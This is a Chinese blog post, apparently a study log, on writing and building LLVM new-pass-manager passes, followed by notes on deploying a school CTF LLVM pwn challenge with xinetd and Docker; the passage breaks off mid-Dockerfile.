<h2 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h2><p>如下图，opt是LLVM的优化器和分析器，可以加载编译好的LLVM Pass，对LLVM IR进行优化。为了对IR进行自定义的优化，我们要做的就是编写好Pass的源代码，编写构建脚本对源码进行编译(一般是.so)，然后用opt工具来加载pass对IR进行优化。</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230713210133.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230713210133"></p>
<p>首先，为了快速入门，先编写一个最基础的Pass，其功能是打印出程序中非外部函数的函数名。</p>
<p>需要注意的是，在<a target="_blank" rel="noopener" href="https://releases.llvm.org/14.0.0/docs/ReleaseNotes.html">LLVM 14.0.0 发行说明</a>中，提到了已经不再推荐使用旧版的pass管理器(the legacy pass manager)，并且旧版在llvm14.0.0之后的版本将被移除，但是网上的大部分pass编写教程都还是基于旧版。本文使用的是LLVM17.0.0 git，编译<a target="_blank" rel="noopener" href="https://github.com/sampsyo/llvm-pass-skeleton/tree/master">旧版框架pass</a>时发现缺少include&#x2F;llvm&#x2F;Transforms&#x2F;IPO&#x2F;PassManagerBuilder.h这个头文件，源代码中也没有lib&#x2F;Transform&#x2F;IPO&#x2F;PassManagerBuilder.cpp源文件，而PassManagerBuilder类用于构建旧版PassManager以及默认的Pass管道，这说明确实已经不支持旧版PM了。所以这里使用新版pass管理器。</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230728151311.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230728151311"></p>
<p><a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html">旧版PM官方教程</a></p>
<p><a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版PM官方教程</a></p>
<p>PM是PassManager的简称</p>
<h3 id="源码集成编译"><a href="#源码集成编译" class="headerlink" title="源码集成编译"></a>源码集成编译</h3><h4 id="不生成和使用-so的pass编写方式"><a href="#不生成和使用-so的pass编写方式" class="headerlink" title="不生成和使用.so的pass编写方式"></a>不生成和使用.so的pass编写方式</h4><p>该方式不会产生pass的.so文件，使用opt时直接添加–passes来使用pass，opt –passes具体的用法在<a target="_blank" rel="noopener" href="https://llvm.org/docs/NewPassManager.html#id2">该文档</a></p>
<p><a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版Writing an LLVM Pass官方教程</a>中是源码内编译的，跟着教程做就可以了</p>
<p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp<code>llvm/lib/Transforms/Utils/CMakeLists.txt</code>中添加HelloWorld.cpp,即Pass的源文件</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172147.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230731172147"></p>
<p>添加llvm&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><br>namespace llvm &#123;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldPass</span> :</span> public PassInfoMixin&lt;HelloWorldPass&gt; &#123;<br>public:<br>  PreservedAnalyses <span class="hljs-title function_">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span>;<br>&#125;;<br><br>&#125; <span class="hljs-comment">// namespace llvm</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span></span><br></code></pre></td></tr></table></figure>

<p>添加llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//===-- HelloWorld.cpp - Example Transformations --------------------------===//</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.</span><br><span class="hljs-comment">// See https://llvm.org/LICENSE.txt for license information.</span><br><span class="hljs-comment">// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//===----------------------------------------------------------------------===//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br><br>using namespace llvm;<br><br>PreservedAnalyses <span class="hljs-title function_">HelloWorldPass::run</span><span class="hljs-params">(Function &amp;F,</span><br><span class="hljs-params">                                      FunctionAnalysisManager &amp;AM)</span> &#123;<br>  errs() &lt;&lt; F.getName() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-keyword">return</span> PreservedAnalyses::all();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在llvm&#x2F;lib&#x2F;Passes&#x2F;PassRegistry.def中添加，该步骤是注册pass，第一个参数即在opt工具中的pass名称</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FUNCTION_PASS</span><span class="hljs-params">(<span class="hljs-string">&quot;helloworld&quot;</span>, HelloWorldPass()</span></span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172806.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230731172806"></p>
<p>运行上文llvm构建一节中的build.sh,重新构建llvm。之前已经构建好的不会重新编译，所以编译得很快</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure>

<p>随后使用opt时加入参数-passes&#x3D;helloworld就能使用该名为helloworld的pass了</p>
<p>测试用例</p>
<p>helloworld.ll</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">define</span> <span class="hljs-type">i32</span> <span class="hljs-title">@foo</span>() &#123;<br>  <span class="hljs-variable">%a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">3</span><br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%a</span><br>&#125;<br><br><span class="hljs-keyword">define</span> void <span class="hljs-title">@bar</span>() &#123;<br>  <span class="hljs-keyword">ret</span> void<br>&#125;<br></code></pre></td></tr></table></figure>

<p>测试结果，测试时位于构建时创建的build目录中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt -disable-output <span class="hljs-string">&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;</span>   -passes=helloworld</span> <br>foo<br>bar<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--print-passes可打印出所有注册的pass</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt --print-passes | grep hello</span> <br>  helloworld<br></code></pre></td></tr></table></figure>

<h4 id="生成和使用-so的pass编写方式"><a href="#生成和使用-so的pass编写方式" class="headerlink" title="生成和使用.so的pass编写方式"></a>生成和使用.so的pass编写方式</h4><p>主要参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-257665.htm">该文章</a>及旧版的<a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html#setting-up-the-build-environment">Writing an LLVM Pass</a></p>
<p>在llvm&#x2F;lib&#x2F;Transforms目录下创建文件夹MyPass</p>
<p>在MyPass文件夹中创建CMakeLists.txt和MyPass.cpp</p>
<p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;CMakeLists.txt</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">add_llvm_library( LLVMMyPass MODULE BUILDTREE_ONLY<br>  MyPass.cpp<br><br>  DEPENDS<br>  intrinsics_gen<br>  PLUGIN_TOOL<br>  opt<br>  )<br></code></pre></td></tr></table></figure>

<p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;MyPass.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;MyPass in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;my-pass&quot;</span>)&#123;  <span class="hljs-comment">//my-pass是使用opt工具加载时的名称</span><br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;CMakeLists.txt中添加</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add_subdirectory</span><span class="hljs-params">(MyPass)</span></span><br></code></pre></td></tr></table></figure>

<p>最后来到llvm构建时创建的build目录中进行构建，只会构建新增的部分，所以构建很快</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./build.sh<br></code></pre></td></tr></table></figure>

<p>生成的.so文件在LLVM&#x2F;llvm-project&#x2F;build&#x2F;lib目录中</p>
<p>现在就可以通过opt工具来使用pass了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;/home/op1n/LLVM/llvm-project/build/lib/LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure>

<h3 id="使用clang源码外构建"><a href="#使用clang源码外构建" class="headerlink" title="使用clang源码外构建"></a>使用clang源码外构建</h3><p>在源码外直接使用clang进行构建最方便</p>
<p>Pass源码，可以在任意目录，只要有源文件即可</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;kkk in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK</span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;kkk&quot;</span>)&#123;<br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用如下命令构建</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared MyPass.cpp -o LLVMMyPass.so `llvm-config --ldflags`<br></code></pre></td></tr></table></figure>

<p>运行Pass，和生成.so的源码集成编译一样，需要so文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;./LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kkk <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span>: foo<br><span class="hljs-title function_">kkk</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">function</span>: bar<br></code></pre></td></tr></table></figure>

<h3 id="pass编写"><a href="#pass编写" class="headerlink" title="pass编写"></a>pass编写</h3><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_3">这篇文章</a>有一些常用LLVM语法，更多更详细的内容在官方手册。</p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>测试clang生成的.ll文件时，需要删去 ‘attributes #0’ 行的’optnone’一词。</p>
<p>或在参数中添加-disable-O0-optnone</p>
<p>例：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">clang -Xclang -disable-O<span class="hljs-number">0</span>-<span class="hljs-keyword">optnone</span> -S -emit-llvm test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure>

<p>否则pass不会生效</p>
<h2 id="校赛LLVM-PWN出题记录"><a href="#校赛LLVM-PWN出题记录" class="headerlink" title="校赛LLVM PWN出题记录"></a>校赛LLVM PWN出题记录</h2><h3 id="1-题目部署"><a href="#1-题目部署" class="headerlink" title="1.题目部署"></a>1.题目部署</h3><p>租的是ubuntu2004阿里云服务器</p>
<p>主要使用xinetd部署,可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/131763593">这篇文章</a></p>
<p>当然实际部署的时候需要做很多修改,以下是成功部署的文件和部署过程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ctf_xinetd<span class="hljs-comment"># ls</span><br>bin  ctf.xinetd  Dockerfile  README.md  start.sh<br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">/ctf_xinetd/bin# <span class="hljs-keyword">ls</span><br><span class="hljs-built_in">exp</span>  flag  lib  optimizer.<span class="hljs-keyword">so</span>  <span class="hljs-keyword">opt</span>  run.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>

<p>lib文件夹是opt运行pass需要的动态链接库，exp是base64解码后的base64输入</p>
<p>基本思路是用户输入的数据经过base64解码后存在exp(ir代码)，然后运行opt使用题目的pass来优化ir，这些操作都在run.sh完成</p>
<p>ctf.xinetd</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">service ctf<br>&#123; <br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = 8888<br>    bind        = 0.0.0.0<br>    server      = /usr/sbin/chroot<br>    # replace helloworld to your program<br>    server_args = --userspec=1000:1000 /home/ctf ./run.sh<br>    banner_fail = /etc/banner_fail<br>    # safety options<br>    per_source  = 10 # the maximum instances of this service per source IP address<br>    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use<br>    #rlimit_as  = 1024M # the Address Space resource limit for the service<br>    #access_times = 2:00-9:00 12:00-24:00<br>&#125;<br></code></pre></td></tr></table></figure>



<p>Dockerfile</p>
<p>主要是在镜像中的bin目录下添加了base64命令和echo命令，同时给了run.sh和ctf用户rwx权限</p>
<p>1.base64命令用户解决.ll文件的传输问题。.ll文件有多行，server不方便读取。base64加密后的数据只有一行，shell脚本中一句read就能读取，读取后再base64解码即可。</p>
<p>2.这里不知道为什么，ctf并不在&#x2F;home&#x2F;ctf的所属组中，改了chown命令也没用，而且要在ctf用户下创建exp文件需要写权限，只能选择了chmod -R 777 &#x2F;home&#x2F;ctf，给了其他用户rwx权限。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 xinetd </span><br><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf </span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cp</span> -R /usr/lib* /home/ctf </span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 666 /home/ctf/dev/*</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/cat /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /usr/bin/base64 /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/echo /home/ctf/bin </span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd 